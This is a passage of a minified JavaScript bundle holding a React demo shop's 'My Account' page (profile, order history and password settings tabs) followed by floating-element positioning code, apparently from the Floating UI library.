short",description:"Password must be at least 6 characters long.",variant:"destructive"});return}Te({title:"Feature not implemented",description:"Password update functionality is not implemented in this demo."})},j=async()=>{try{await n(),s("/")}catch(k){console.error("Logout error:",k)}},T=async()=>{try{await i(),Te({title:"Session refreshed",description:"Your session has been refreshed from localStorage token."})}catch(k){console.error("Error refreshing session:",k),Te({title:"Session refresh failed",description:"Could not refresh your session. Please try logging in again.",variant:"destructive"})}};return d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow container mx-auto px-4 py-8",children:[d.jsx("h1",{className:"text-3xl font-serif mb-8",children:"My Account"}),d.jsxs("div",{className:"mb-6 p-4 bg-yellow-50 border border-yellow-200 rounded-md",children:[d.jsx("h3",{className:"text-lg font-medium mb-2",children:"Session Information"}),d.jsxs("p",{className:"text-gray-600 mb-3",children:["User ID: ",t.uid]}),d.jsx(oe,{onClick:T,variant:"outline",className:"mr-2",children:"Refresh Session from Token"})]}),d.jsxs(Dy,{defaultValue:"profile",className:"w-full",children:[d.jsxs(Yh,{className:"grid w-full max-w-md grid-cols-3 mb-8",children:[d.jsx(Tr,{value:"profile",children:"Profile"}),d.jsx(Tr,{value:"orders",children:"Orders"}),d.jsx(Tr,{value:"settings",children:"Settings"})]}),d.jsx(_s,{value:"profile",children:d.jsxs(Vu,{className:"max-w-2xl mx-auto",children:[d.jsxs(Hu,{children:[d.jsx(Wu,{children:"Personal Information"}),d.jsx(Ku,{children:"Manage your personal information and account details"})]}),d.jsxs(Gu,{className:"space-y-4",children:[d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"email",children:"Email"}),d.jsx(Xt,{id:"email",type:"email",value:t.email||"",readOnly:!0,className:"bg-gray-50"}),d.jsx("p",{className:"text-sm text-gray-500",children:"Your email address is also your username"})]}),d.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"firstName",children:"First Name"}),d.jsx(Xt,{id:"firstName",type:"text",placeholder:"Enter your first name",value:o,onChange:k=>a(k.target.value)})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"lastName",children:"Last Name"}),d.jsx(Xt,{id:"lastName",type:"text",placeholder:"Enter your last name",value:c,onChange:k=>u(k.target.value)})]})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"phone",children:"Phone Number"}),d.jsx(Xt,{id:"phone",type:"tel",placeholder:"Enter your phone number",value:p,onChange:k=>f(k.target.value)})]})]}),d.jsxs(hg,{className:"flex justify-between",children:[d.jsx(oe,{variant:"outline",onClick:j,children:"Sign Out"}),d.jsx(oe,{onClick:N,children:"Save Changes"})]})]})}),d.jsx(_s,{value:"orders",children:d.jsxs(Vu,{children:[d.jsxs(Hu,{children:[d.jsx(Wu,{children:"Order History"}),d.jsx(Ku,{children:"View and track your past orders"})]}),d.jsx(Gu,{children:h.length>0?d.jsx("div",{className:"space-y-4",children:h.map(k=>{var O;return d.jsxs("div",{className:"border p-4 rounded-lg",children:[d.jsxs("div",{className:"flex justify-between mb-2",children:[d.jsxs("span",{className:"font-medium",children:["Order #",k.id.slice(0,8)]}),d.jsx("span",{children:new Date(k.date).toLocaleDateString()})]}),d.jsxs("div",{className:"text-sm text-gray-500",children:["Status: ",k.status||"Processing"]}),d.jsxs("div",{className:"mt-2 font-medium",children:["Total: $",((O=k.total)==null?void 0:O.toFixed(2))||"0.00"]})]},k.id)})}):d.jsxs("div",{className:"flex flex-col items-center justify-center py-12",children:[d.jsx("div",{className:"rounded-full bg-primary/10 p-6 mb-4",children:d.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",className:"h-10 w-10 text-primary",fill:"none",viewBox:"0 0 24 24",stroke:"currentColor",children:d.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"})})}),d.jsx("h3",{className:"text-lg font-medium mb-2",children:"No orders yet"}),d.jsx("p",{className:"text-gray-500 text-center mb-6",children:"You haven't placed any orders yet. Start shopping to see your orders here!"}),d.jsx(oe,{asChild:!0,children:d.jsx("a",{href:"/products",children:"Start Shopping"})})]})})]})}),d.jsx(_s,{value:"settings",children:d.jsxs(Vu,{className:"max-w-2xl mx-auto",children:[d.jsxs(Hu,{children:[d.jsx(Wu,{children:"Account Settings"}),d.jsx(Ku,{children:"Manage your account settings and preferences"})]}),d.jsxs(Gu,{className:"space-y-4",children:[d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"currentPassword",children:"Current Password"}),d.jsx(Xt,{id:"currentPassword",type:"password",placeholder:"Enter your current password",value:_,onChange:k=>y(k.target.value)})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"newPassword",children:"New Password"}),d.jsx(Xt,{id:"newPassword",type:"password",placeholder:"Enter your new password",value:C,onChange:k=>x(k.target.value)})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"confirmPassword",children:"Confirm New Password"}),d.jsx(Xt,{id:"confirmPassword",type:"password",placeholder:"Confirm your new password",value:w,onChange:k=>S(k.target.value)})]})]}),d.jsx(hg,{className:"flex justify-end",children:d.jsx(oe,{onClick:R,children:"Update Password"})})]})})]})]}),d.jsx(Ri,{})]})},w$=["top","right","bottom","left"],zi=Math.min,Zt=Math.max,Yd=Math.round,xu=Math.floor,Bi=t=>({x:t,y:t}),x$={left:"right",right:"left",bottom:"top",top:"bottom"},E$={start:"end",end:"start"};function fg(t,e,n){return Zt(t,zi(e,n))}function jr(t,e){return typeof t=="function"?t(e):t}function Mr(t){return t.split("-")[0]}function fa(t){return t.split("-")[1]}function Fy(t){return t==="x"?"y":"x"}function Uy(t){return t==="y"?"height":"width"}function Vi(t){return["top","bottom"].includes(Mr(t))?"y":"x"}function $y(t){return Fy(Vi(t))}function C$(t,e,n){n===void 0&&(n=!1);const r=fa(t),i=$y(t),s=Uy(i);let o=i==="x"?r===(n?"end":"start")?"right":"left":r==="start"?"bottom":"top";return e.reference[s]>e.floating[s]&&(o=Qd(o)),[o,Qd(o)]}function S$(t){const e=Qd(t);return[pg(t),e,pg(e)]}function pg(t){return t.replace(/start|end/g,e=>E$[e])}function b$(t,e,n){const r=["left","right"],i=["right","left"],s=["top","bottom"],o=["bottom","top"];switch(t){case"top":case"bottom":return n?e?i:r:e?r:i;case"left":case"right":return e?s:o;default:return[]}}function T$(t,e,n,r){const i=fa(t);let s=b$(Mr(t),n==="start",r);return i&&(s=s.map(o=>o+"-"+i),e&&(s=s.concat(s.map(pg)))),s}function Qd(t){return t.replace(/left|right|bottom|top/g,e=>x$[e])}function I$(t){return{top:0,right:0,bottom:0,left:0,...t}}function jN(t){return typeof t!="number"?I$(t):{top:t,right:t,bottom:t,left:t}}function Xd(t){const{x:e,y:n,width:r,height:i}=t;return{width:r,height:i,top:n,left:e,right:e+r,bottom:n+i,x:e,y:n}}function eE(t,e,n){let{reference:r,floating:i}=t;const s=Vi(e),o=$y(e),a=Uy(o),c=Mr(e),u=s==="y",p=r.x+r.width/2-i.width/2,f=r.y+r.height/2-i.height/2,h=r[a]/2-i[a]/2;let E;switch(c){case"top":E={x:p,y:r.y-i.height};break;case"bottom":E={x:p,y:r.y+r.height};break;case"right":E={x:r.x+r.width,y:f};break;case"left":E={x:r.x-i.width,y:f};break;default:E={x:r.x,y:r.y}}switch(fa(e)){case"start":E[o]-=h*(n&&u?-1:1);break;case"end":E[o]+=h*(n&&u?-1:1);break}return E}const N$=async(t,e,n)=>{const{placement:r="bottom",strategy:i="absolute",middleware:s=[],platform:o}=n,a=s.filter(Boolean),c=await(o.isRTL==null?void 0:o.isRTL(e));let u=await o.getElementRects({reference:t,floating:e,strategy:i}),{x:p,y:f}=eE(u,r,c),h=r,E={},_=0;for(let y=0;y<a.length;y++){const{name:C,fn:x}=a[y],{x:w,y:S,data:N,reset:R}=await x({x:p,y:f,initialPlacement:r,placement:h,strategy:i,middlewareData:E,rects:u,platform:o,elements:{reference:t,floating:e}});p=w??p,f=S??f,E={...E,[C]:{...E[C],...N}},R&&_<=50&&(_++,typeof R=="object"&&(R.placement&&(h=R.placement),R.rects&&(u=R.rects===!0?await o.getElementRects({reference:t,floating:e,strategy:i}):R.rects),{x:p,y:f}=eE(u,h,c)),y=-1)}return{x:p,y:f,placement:h,strategy:i,middlewareData:E}};async function Jl(t,e){var n;e===void 0&&(e={});const{x:r,y:i,platform:s,rects:o,elements:a,strategy:c}=t,{boundary:u="clippingAncestors",rootBoundary:p="viewport",elementContext:f="floating",altBoundary:h=!1,padding:E=0}=jr(e,t),_=jN(E),C=a[h?f==="floating"?"reference":"floating":f],x=Xd(await s.getClippingRect({element:(n=await(s.isElement==null?void 0:s.isElement(C)))==null||n?C:C.contextElement||await(s.getDocumentElement==null?void 0:s.getDocumentElement(a.floating)),boundary:u,rootBoundary:p,strategy:c})),w=f==="floating"?{x:r,y:i,width:o.floating.width,height:o.floating.height}:o.reference,S=await(s.getOffsetParent==null?void 0:s.getOffsetParent(a.floating)),N=await(s.isElement==null?void 0:s.isElement(S))?await(s.getScale==null?void 0:s.getScale(S))||{x:1,y:1}:{x:1,y:1},R=Xd(s.convertOffsetParentRelativeRectToViewportRelativeRect?await s.convertOffsetParentRelativeRectToViewportRelativeRect({elements:a,rect:w,offsetParent:S,strategy:c}):w);return{top:(x.top-R.top+_.top)/N.y,bottom:(R.bottom-x.bottom+_.bottom)/N.y,left:(x.left-R.left+_.left)/N.x,right:(R.right-x.right+_.right)/N.x}}const k$=t=>({name:"arrow",options:t,async fn(e){const{x:n,y:r,placement:i,rects:s,platform:o,elements:a,middlewareData:c}=e,{element:u,padding:p=0}=jr(t,e)||{};if(u==null)return{};const f=jN(p),h={x:n,y:r},E=$y(i),_=Uy(E),y=await o.getDimensions(u),C=E==="y",x=C?"top":"left",w=C?"bottom":"right",S=C?"clientHeight":"clientWidth",N=s.reference[_]+s.reference[E]-h[E]-s.floating[_],R=h[E]-s.reference[E],j=await(o.getOffsetParent==null?void 0:o.getOffsetParent(u));let T=j?j[S]:0;(!T||!await(o.isElement==null?void 0:o.isElement(j)))&&(T=a.floating[S]||s.floating[_]);const b=N/2-R/2,P=T/2-y[_]/2-1,k=zi(f[x],P),O=zi(f[w],P),D=k,A=T-y[_]-O,V=T/2-y[_]/2+b,Z=fg(D,V,A),q=!c.arrow&&fa(i)!=null&&V!==Z&&s.reference[_]/2-(V<D?k:O)-y[_]/2<0,J=q?V<D?V-D:V-A:0;return{[E]:h[E]+J,data:{[E]:Z,centerOffset:V-Z-J,...q&&{alignmentOffset:J}},reset:q}}}),P$=function(t){return t===void 0&&(t={}),{name:"flip",options:t,async fn(e){var n,r;const{placement:i,middlewareData:s,rects:o,initialPlacement:a,platform:c,elements:u}=e,{mainAxis:p=!0,crossAxis:f=!0,fallbackPlacements:h,fallbackStrategy:E="bestFit",fallbackAxisSideDirection:_="none",flipAlignment:y=!0,...C}=jr(t,e);if((n=s.arrow)!=null&&n.alignmentOffset)return{};const x=Mr(i),w=Vi(a),S=Mr(a)===a,N=await(c.isRTL==null?void 0:c.isRTL(u.floating)),R=h||(S||!y?[Qd(a)]:S$(a)),j=_!=="none";!h&&j&&R.push(...T$(a,y,_,N));const T=[a,...R],b=await Jl(e,C),P=[];let k=((r=s.flip)==null?void 0:r.overflows)||[];if(p&&P.push(b[x]),f){const V=C$(i,o,N);P.push(b[V[0]],b[V[1]])}if(k=[...k,{placement:i,overflows:P}],!P.every(V=>V<=0)){var O,D;const V=(((O=s.flip)==null?void 0:O.index)||0)+1,Z=T[V];if(Z)return{data:{index:V,overflows:k},reset:{placement:Z}};let q=(D=k.filter(J=>J.overflows[0]<=0).sort((J,L)=>J.overflows[1]-L.overflows[1])[0])==null?void 0:D.placement;if(!q)switch(E){case"bestFit":{var A;const J=(A=k.filter(L=>{if(j){const z=Vi(L.placement);return z===w||z==="y"}return!0}).map(L=>[L.placement,L.overflows.filter(z=>z>0).reduce((z,Y)=>z+Y,0)]).sort((L,z)=>L[1]-z[1])[0])==null?void 0:A[0];J&&(q=J);break}case"initialPlacement":q=a;break}if(i!==q)return{reset:{placement:q}}}return{}}}};function tE(t,e){return{top:t.top-e.height,right:t.right-e.width,bottom:t.bottom-e.height,left:t.left-e.width}}function nE(t){return w$.some(e=>t[e]>=0)}const R$=function(t){return t===void 0&&(t={}),{name:"hide",options:t,async fn(e){const{rects:n}=e,{strategy:r="referenceHidden",...i}=jr(t,e);switch(r){case"referenceHidden":{const s=await Jl(e,{...i,elementContext:"reference"}),o=tE(s,n.reference);return{data:{referenceHiddenOffsets:o,referenceHidden:nE(o)}}}case"escaped":{const s=await Jl(e,{...i,altBoundary:!0}),o=tE(s,n.floating);return{data:{escapedOffsets:o,escaped:nE(o)}}}default:return{}}}}};async function A$(t,e){const{placement:n,platform:r,elements:i}=t,s=await(r.isRTL==null?void 0:r.isRTL(i.floating)),o=Mr(n),a=fa(n),c=Vi(n)==="y",u=["left","top"].includes(o)?-1:1,p=s&&c?-1:1,f=jr(e,t);let{mainAxis:h,crossAxis:E,alignmentAxis:_}=typeof f=="number"?{mainAxis:f,crossAxis:0,alignmentAxis:null}:{mainAxis:f.mainAxis||0,crossAxis:f.crossAxis||0,alignmentAxis:f.alignmentAxis};return a&&typeof _=="number"&&(E=a==="end"?_*-1:_),c?{x:E*p,y:h*u}:{x:h*u,y:E*p}}const O$=function(t){return t===void 0&&(t=0),{name:"offset",options:t,async fn(e){var n,r;const{x:i,y:s,placement:o,middlewareData:a}=e,c=await A$(e,t);return o===((n=a.offset)==null?void 0:n.placement)&&(r=a.arrow)!=null&&r.alignmentOffset?{}:{x:i+c.x,y:s+c.y,data:{...c,placement:o}}}}},D$=function(t){return t===void 0&&(t={}),{name:"shift",options:t,async fn(e){const{x:n,y:r,placement:i}=e,{mainAxis:s=!0,crossAxis:o=!1,limiter:a={fn:C=>{let{x,y:w}=C;return{x,y:w}}},...c}=jr(t,e),u={x:n,y:r},p=await Jl(e,c),f=Vi(Mr(i)),h=Fy(f);let E=u[h],_=u[f];if(s){const C=h==="y"?"top":"left",x=h==="y"?"bottom":"right",w=E+p[C],S=E-p[x];E=fg(w,E,S)}if(o){const C=f==="y"?"top":"left",x=f==="y"?"bottom":"right",w=_+p[C],S=_-p[x];_=fg(w,_,S)}const y=a.fn({...e,[h]:E,[f]:_});return{...y,data:{x:y.x-n,y:y.y-r,enabled:{[h]:s,[f]:o}}}}}},j$=function(t){return t===void 0&&(t={}),{options:t,fn(e){const{x:n,y:r,placement:i,rects:s,middlewareData:o}=e,{offset:a=0,mainAxis:c=!0,crossAxis:u=!0}=jr(t,e),p={x:n,y:r},f=Vi(i),h=Fy(f);let E=p[h],_=p[f];const y=jr(a,e),C=typeof y=="number"?{mainAxis:y,crossAxis:0}:{mainAxis:0,crossAxis:0,...y};if(c){const S=h==="y"?"height":"width",N=s.reference[h]-s.floating[S]+C.mainAxis,R=s.reference[h]+s.reference[S]-C.mainAxis;E<N?E=N:E>R&&(E=R)}if(u){var x,w;const S=h==="y"?"width":"height",N=["top","left"].includes(Mr(i)),R=s.reference[f]-s.floating[S]+(N&&((x=o.offset)==null?void 0:x[f])||0)+(N?0:C.crossAxis),j=s.reference[f]+s.reference[S]+(N?0:((w=o.offset)==null?void 0:w[f])||0)-(N?C.crossAxis:0);_<R?_=R:_>j&&(_=j)}return{[h]:E,[f]:_}}}},M$=function(t){return t===void 0&&(t={}),{name:"size",options:t,async fn(e){var n,r;const{placement:i,rects:s,platform:o,elements:a}=e,{apply:c=()=>{},...u}=jr(t,e),p=await Jl(e,u),f=Mr(i),h=fa(i),E=Vi(i)==="y",{width:_,height:y}=s.floating;let C,x;f==="top"||f==="bottom"?(C=f,x=h===(await(o.isRTL==null?void 0:o.isRTL(a.floating))?"start":"end")?"left":"right"):(x=f,C=h==="end"?"top":"bottom");const w=y-p.top-p.bottom,S=_-p.left-p.right,N=zi(y-p[C],w),R=zi(_-p[x],S),j=!e.middlewareData.shift;let T=N,b=R;if((n=e.middlewareData.shift)!=null&&n.enabled.x&&(b=S),(r=e.middlewareData.shift)!=null&&r.enabled.y&&(T=w),j&&!h){const k=Zt(p.left,0),O=Zt(p.right,0),D=Zt(p.top,0),A=Zt(p.bottom,0);E?b=_-2*(k!==0||O!==0?k+O:Zt(p.left,p.right)):T=y-2*(D!==0||A!==0?D+A:Zt(p.top,p.bottom))}await c({...e,availableWidth:b,availableHeight:T});const P=await o.getDimensions(a.floating);return _!==P.width||y!==P.height?{reset:{rects:!0}}:{}}}};function Xh(){return typeof window<"u"}function pa(t){return MN(t)?(t.nodeName||"").toLowerCase():"#document"}function nn(t){var e;return(t==null||(e=t.ownerDocument)==null?void 0:e.defaultView)||window}function lr(t){var e;return(e=(MN(t)?t.ownerDocument:t.document)||window.document)==null?void 0:e.documentElement}function MN(t){return Xh()?t instanceof Node||t instanceof nn(t).Node:!1}function Fn(t){return Xh()?t instanceof Element||t instanceof nn(t).Element:!1}function ir(t){return Xh()?t instanceof HTMLElement||t instanceof nn(t).HTMLElement:!1}function rE(t){return!Xh()||typeof ShadowRoot>"u"?!1:t instanceof ShadowRoot||t instanceof nn(t).ShadowRoot}function Ic(t){const{overflow:e,overflowX:n,overflowY:r,display:i}=Un(t);return/auto|scroll|overlay|hidden|clip/.test(e+r+n)&&!["inline","contents"].includes(i)}function L$(t){return["table","td","th"].includes(pa(t))}function Jh(t){return[":popover-open",":modal"].some(e=>{try{return t.matches(e)}catch{return!1}})}function zy(t){const e=By(),n=Fn(t)?Un(t):t;return n.transform!=="none"||n.perspective!=="none"||(n.containerType?n.containerType!=="normal":!1)||!e&&(n.backdropFilter?n.backdropFilter!=="none":!1)||!e&&(n.filter?n.filter!=="none":!1)||["transform","perspective","filter"].some(r=>(n.willChange||"").includes(r))||["paint","layout","strict","content"].some(r=>(n.contain||"").includes(r))}function F$(t){let e=Hi(t);for(;ir(e)&&!Ko(e);){if(zy(e))return e;if(Jh(e))return null;e=Hi(e)}return null}function By(){return typeof CSS>"u"||!CSS.supports?!1:CSS.supports("-webkit-backdrop-filter","none")}function Ko(t){return["html","body","#document"].includes(pa(t))}function Un(t){return nn(t).getComputedStyle(t)}function Zh(t){return Fn(t)?{scrollLeft:t.scrollLeft,scrollTop:t.scrollTop}:{scrollLeft:t.scrollX,scrollTop:t.scrollY}}function Hi(t){if(pa(t)==="html")return t;const e=t.assignedSlot||t.parentNode||rE(t)&&t.host||lr(t);return rE(e)?e.host:e}function LN(t){const e=Hi(t);return Ko(e)?t.ownerDocument?t.ownerDocument.body:t.body:ir(e)&&Ic(e)?e:LN(e)}function Zl(t,e,n){var r;e===void 0&&(e=[]),n===void 0&&(n=!0);const i=LN(t),s=i===((r=t.ownerDocument)==null?void 0:r.body),o=nn(i);if(s){const a=mg(o);return e.concat(o,o.visualViewport||[],Ic(i)?i:[],a&&n?Zl(a):[])}return e.concat(i,Zl(i,[],n))}function mg(t){return t.parent&&Object.getPrototypeOf(t.parent)?t.frameElement:null}function FN(t){const e=Un(t);let n=parseFloat(e.width)||0,r=parseFloat(e.height)||0;const i=ir(t),s=i?t.offsetWidth:n,o=i?t.offsetHeight:r,a=Yd(n)!==s||Yd(r)!==o;return a&&(n=s,r=o),{width:n,height:r,$:a}}function Vy(t){return Fn(t)?t:t.contextElement}function xo(t){const e=Vy(t);if(!ir(e))return Bi(1);const n=e.getBoundingClientRect(),{width:r,height:i,$:s}=FN(e);let o=(s?Yd(n.width):n.width)/r,a=(s?Yd(n.height):n.height)/i;return(!o||!Number.isFinite(o))&&(o=1),(!a||!Number.isFinite(a))&&(a=1),{x:o,y:a}}const U$=Bi(0);function UN(t){const e=nn(t);return!By()||!e.visualViewport?U$:{x:e.visualViewport.offsetLeft,y:e.visualViewport.offsetTop}}function $$(t,e,n){return e===void 0&&(e=!1),!n||e&&n!==nn(t)?!1:e}function Rs(t,e,n,r){e===void 0&&(e=!1),n===void 0&&(n=!1);const i=t.getBoundingClientRect(),s=Vy(t);let o=Bi(1);e&&(r?Fn(r)&&(o=xo(r)):o=xo(t));const a=$$(s,n,r)?UN(s):Bi(0);let c=(i.left+a.x)/o.x,u=(i.top+a.y)/o.y,p=i.width/o.x,f=i.height/o.y;if(s){const h=nn(s),E=r&&Fn(r)?nn(r):r;let _=h,y=mg(_);for(;y&&r&&E!==_;){const C=xo(y),x=y.getBoundingClientRect(),w=Un(y),S=x.left+(y.clientLeft+parseFloat(w.paddingLeft))*C.x,N=x.top+(y.clientTop+parseFloat(w.paddingTop))*C.y;c*=C.x,u*=C.y,p*=C.x,f*=C.y,c+=S,u+=N,_=nn(y),y=mg(_)}}return Xd({width:p,height:f,x:c,y:u})}function z$(t){let{elements:e,rect:n,offsetParent:r,strategy:i}=t;const s=i==="fixed",o=lr(r),a=e?Jh(e.floating):!1;if(r===o||a&&s)return n;let c={scrollLeft:0,scrollTop:0},u=Bi(1);const p=Bi(0),f=ir(r);if((f||!f&&!s)&&((pa(r)!=="body"||Ic(o))&&(c=Zh(r)),ir(r))){const h=Rs(r);u=xo(r),p.x=h.x+r.clientLeft,p.y=h.y+r.clientTop}return{width:n.width*u.x,height:n.height*u.y,x:n.x*u.x-c.scrollLeft*u.x+p.x,y:n.y*u.y-c.scrollTop*u.y+p.y}}function B$(t){return Array.from(t.getClientRects())}function gg(t,e){const n=Zh(t).scrollLeft;return e?e.left+n:Rs(lr(t)).left+n}function V$(t){const e=lr(t),n=Zh(t),r=t.ownerDocument.body,i=Zt(e.scrollWidth,e.clientWidth,r.scrollWidth,r.clientWidth),s=Zt(e.scrollHeight,e.clientHeight,r.scrollHeight,r.clientHeight);let o=-n.scrollLeft+gg(t);const a=-n.scrollTop;return Un(r).direction==="rtl"&&(o+=Zt(e.clientWidth,r.clientWidth)-i),{width:i,height:s,x:o,y:a}}function H$(t,e){const n=nn(t),r=lr(t),i=n.visualViewport;let s=r.clientWidth,o=r.clientHeight,a=0,c=0;if(i){s=i.width,o=i.height;const u=By();(!u||u&&e==="fixed")&&(a=i.offsetLeft,c=i.offsetTop)}return{width:s,height:o,x:a,y:c}}function W$(t,e){const n=Rs(t,!0,e==="fixed"),r=n.top+t.clientTop,i=n.left+t.clientLeft,s=ir(t)?xo(t):Bi(1),o=t.clientWidth*s.x,a=t.clientHeight*s.y,c=i*s.x,u=r*s.y;return{width:o,height:a,x:c,y:u}}function iE(t,e,n){let r;if(e==="viewport")r=H$(t,n);else if(e==="document")r=V$(lr(t));else if(Fn(e))r=W$(e,n);else{const i=UN(t);r={...e,x:e.x-i.x,y:e.y-i.y}}return Xd(r)}function $N(t,e){const n=Hi(t);return n===e||!Fn(n)||Ko(n)?!1:Un(n).position==="fixed"||$N(n,e)}function K$(t,e){const n=e.get(t);if(n)return n;let r=Zl(t,[],!1).filter(a=>Fn(a)&&pa(a)!=="body"),i=null;const s=Un(t).position==="fixed";let o=s?Hi(t):t;for(;Fn(o)&&!Ko(o);){const a=Un(o),c=zy(o);!c&&a.position==="fixed"&&(i=null),(s?!c&&!i:!c&&a.position==="static"&&!!i&&["absolute","fixed"].includes(i.position)||Ic(o)&&!c&&$N(t,o))?r=r.filter(p=>p!==o):i=a,o=Hi(o)}return e.set(t,r),r}function G$(t){let{element:e,boundary:n,rootBoundary:r,strategy:i}=t;const o=[...n==="clippingAncestors"?Jh(e)?[]:K$(e,this._c):[].concat(n),r],a=o[0],c=o.reduce((u,p)=>{const f=iE(e,p,i);return u.top=Zt(f.top,u.top),u.right=zi(f.right,u.right),u.bottom=zi(f.bottom,u.bottom),u.left=Zt(f.left,u.left),u},iE(e,a,i));return{width:c.right-c.left,height:c.bottom-c.top,x:c.left,y:c.top}}function q$(t){const{width:e,height:n}=FN(t);return{width:e,height:n}}function Y$(t,e,n){const r=ir(e),i=lr(e),s=n==="fixed",o=Rs(t,!0,s,e);let a={scrollLeft:0,scrollTop:0};const c=Bi(0);if(r||!r&&!s)if((pa(e)!=="body"||Ic(i))&&(a=Zh(e)),r){const E=Rs(e,!0,s,e);c.x=E.x+e.clientLeft,c.y=E.y+e.clientTop}else i&&(c.x=gg(i));let u=0,p=0;if(i&&!r&&!s){const E=i.getBoundingClientRect();p=E.top+a.scrollTop,u=E.left+a.scrollLeft-gg(i,E)}const f=o.left+a.scrollLeft-c.x-u,h=o.top+a.scrollTop-c.y-p;return{x:f,y:h,width:o.width,height:o.height}}function bp(t){return Un(t).position==="static"}function sE(t,e){if(!ir(t)||Un(t).position==="fixed")return null;if(e)return e(t);let n=t.offsetParent;return lr(t)===n&&(n=n.ownerDocument.body),n}function zN(t,e){const n=nn(t);if(Jh(t))return n;if(!ir(t)){let i=Hi(t);for(;i&&!Ko(i);){if(Fn(i)&&!bp(i))return i;i=Hi(i)}return n}let r=sE(t,e);for(;r&&L$(r)&&bp(r);)r=sE(r,e);return r&&Ko(r)&&bp(r)&&!zy(r)?n:r||F$(t)||n}const Q$=async function(t){const e=this.getOffsetParent||zN,n=this.getDimensions,r=await n(t.floating);return{reference:Y$(t.reference,await e(t.floating),t.strategy),floating:{x:0,y:0,width:r.width,height:r.height}}};function X$(t){return Un(t).direction==="rtl"}const J$={convertOffsetParentRelativeRectToViewportRelativeRect:z$,getDocumentElement:lr,getClippingRect:G$,getOffsetParent:zN,getElementRects:Q$,getClientRects:B$,getDimensions:q$,getScale:xo,isElement:Fn,isRTL:X$};function Z$(t,e){let n=null,r;const i=lr(t);function s(){var a;clearTimeout(r),(a=n)==null||a.disconnect(),n=null}function o(a,c){a===void 0&&(a=!1),c===void 0&&(c=1),s();const{left:u,top:p,width:f,height:h}=t.getBoundingClientRect();if(a||e(),!f||!h)return;const E=xu(p),_=xu(i.clientWidth-(u+f)),y=xu(i.clientHeight-(p+h)),C=xu(u),w={rootMargin:-E+"px "+-_+"px "+-y+"px "+-C+"px",threshold:Zt(0,zi(1,c))||1};let S=!0;function N(R){const j=R[0].intersectionRatio;if(j!==c){if(!S)return o();j?o(!1,j):r=setTimeout(()=>{o(!1,1e-7)},1e3)}S=!1}try{n=new IntersectionObserver(N,{...w,root:i.ownerDocument})}catch{n=new IntersectionObserver(N,w)}n.observe(t)}return o(!0),s}function ez(t,e,n,r){r===void 0&&(r={});const{ancestorScroll:i=!0,ancestorResize:s=!0,elementResize:o=typeof ResizeObserver=="function",layoutShift:a=typeof IntersectionObserver=="function",animationFrame:c=!1}=r,u=Vy(t),p=i||s?[...u?Zl(u):[],...Zl(e)]:[];p.forEach(x=>{i&&x.addEventListener("scroll",n,{passive:!0}),s&&x.addEventListener("resize",n)});const f=u&&a?Z$(u,n):null;let h=-1,E=null;o&&(E=new ResizeObserver(x=>{let[w]=x;w&&w.target===u&&E&&(E.unobserve(e),cancelAnimationFrame(h),h=requestAnimationFrame(()=>{var S;(S=E)==null||S.observe(e)})),n()}),u&&!c&&E.observe(u),E.observe(e));let _,y=c?Rs(t):null;c&&C();function C(){const x=Rs(t);y&&(x.x!==y.x||x.y!==y.y||x.width!==y.width||x.height!==y.height)&&n(),y=x,_=requestAnimationFrame(C)}return n(),()=>{var x;p.forEach(w=>{i&&w.removeEventListener("scroll",n),s&&w.removeEventListener("resize",n)}),f==null||f(),(x=E)==null||x.disconnect(),E=null,c&&cancelAnimationFrame(_)}}const tz=O$,nz=D$,rz=P$,iz=M$,sz=R$,oE=k$,oz=j$,az=(t,e,n)=>{const r=new Map,i={platform:J$,...n},s={...i.platform,_c:r};return N$(t,e,{...i,platform:s})};var qu=typeof document<"u"?v.useLayoutEffect:v.useEffect;function Jd(t,e){if(t===e)return!0;if(typeof t!=typeof e)return!1;if(typeof t=="function"&&t.toString()===e.toString())return!0;let n,r,i;if(t&&e&&typeof t=="object"){if(Array.isArray(t)){if(n=t.length,n!==e.length)return!1;for(r=n;r--!==0;)if(!Jd(t[r],e[r]))return!1;return!0}if(i=Object.keys(t),n=i.length,n!==Object.keys(e).length)return!1;for(r=n;r--!==0;)if(!{}.hasOwnProperty.call(e,i[r]))return!1;for(r=n;r--!==0;){const s=i[r];if(!(s==="_owner"&&t.$$typeof)&&!Jd(t[s],e[s]))return!1}return!0}return t!==t&&e!==e}function BN(t){return typeof window>"u"?1:(t.ownerDocument.defaultView||window).devicePixelRatio||1}function aE(t,e){const n=BN(t);return Math.round(e*n)/n}function Tp(t){const e=v.useRef(t);return qu(()=>{e.current=t}),e}function lz(t){t===void 0&&(t={});const{placement:e="bottom",strategy:n="absolute",middleware:r=[],platform:i,elements:{reference:s,floating:o}={},transform:a=!0,whileElementsMounted:c,open:u}=t,[p,f]=v.useState({x:0,y:0,strategy:n,placement:e,middlewareData:{},isPositioned:!1}),[h,E]=v.useState(r);Jd(h,r)||E(r);const[_,y]=v.useState(null),[C,x]=v.useState(null),w=v.useCallback(L=>{L!==j.current&&(j.current=L,y(L))},[]),S=v.useCallback(L=>{L!==T.current&&(T.current=L,x(L))},[]),N=s||_,R=o||C,j=v.useRef(null),T=v.useRef(null),b=v.useRef(p),P=c!=null,k=Tp(c),O=Tp(i),D=Tp(u),A=v.useCallback(()=>{if(!j.current||!T.current)return;const L={placement:e,strategy:n,middleware:h};O.current&&(L.platform=O.current),az(j.current,T.current,L).then(z=>{const 